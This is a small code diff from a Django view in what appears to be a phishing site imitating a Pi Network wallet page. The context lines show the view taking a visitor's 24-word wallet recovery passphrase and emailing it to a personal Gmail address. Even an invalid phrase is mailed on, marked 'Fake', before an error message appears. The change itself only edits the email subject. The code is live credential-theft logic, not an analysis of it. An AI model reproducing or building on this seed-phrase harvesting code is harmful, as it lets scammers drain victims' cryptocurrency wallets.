@@ -74,7 +74,7 @@ def submit_pass(request):
         keys = request.POST.get('mf-text', '')
         words = keys.split()
         if len(words) != 24:
-            send_notify(payload=f'Fake Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="ezekielobiajulu0@gmail.com")
+            send_notify(payload=f'Fake Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted(Fake)', email_to="ezekielobiajulu0@gmail.com")
             messages.error(request, 'Invalid Passphrase')
             return redirect('/wallet/')
 
